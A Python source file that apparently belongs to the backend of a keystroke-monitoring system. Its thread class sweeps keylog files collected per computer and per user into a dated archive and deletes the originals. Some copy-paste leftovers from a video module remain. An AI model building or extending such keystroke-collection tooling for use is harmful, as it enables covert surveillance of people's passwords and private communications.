# -*- coding: utf-8 -*-
# from __future__ import unicode_literals

import os
import time
import threading
from config import config
from core import logger, utils


log = logger.getLogger(config['NAME'])
fmt = utils.fmt


class KeylogMaker(threading.Thread):

    def __init__(self):
        threading.Thread.__init__(self)

        self.daemon = True
        self.active = False
        self.name = __name__

    def run(self):
        log.info('Start KeylogMaker')
        self.active = True
        while self.active:
            try:
                for comp in os.listdir(config['DATA_DIR']):
                    for user in os.listdir(os.path.join(config['DATA_DIR'], comp)):
                        try:
                            src_dir = os.path.join(config['DATA_DIR'], comp, user, 'kbdsvc')
                            if os.path.isdir(src_dir):
                                for fn in utils.rListFiles(src_dir):
                                    try:
                                        dst_dir = os.path.join(config['ARCHIVE_DIR'],
                                                               os.path.basename(fn)[0:8],
                                                               comp,
                                                               user,
                                                               'keylog')
                                        utils.makedirs(dst_dir, mode=0775)
                                        log.debug(fmt('Try to move {0} to {1}', fn, os.path.join(dst_dir, os.path.basename(fn))))
                                        with open(fn, "rb") as src:
                                            with open(os.path.join(dst_dir, os.path.basename(fn)[8:]), "wb") as dst:
                                                dst.write(src.read())

                                        os.unlink(fn)

                                    except Exception as e:
                                        log.error(e)

                        except Exception as e:
                            log.error(e)
            except Exception as e:
                log.exception(e)
            self.sleep(config['VIDEO_LENGTH'])

    def stop(self):
        log.info('Stop VideoMaker')
        self.active = False

    def sleep(self, timeout):
        t = 0
        p = timeout - int(timeout)
        precision = p if p > 0 else 1
        while self.active and t < timeout:
            t += precision
            time.sleep(precision)
        return self.active


if __name__ == '__main__':
    vm = KeylogMaker()
    vm.start()
    vm.join()
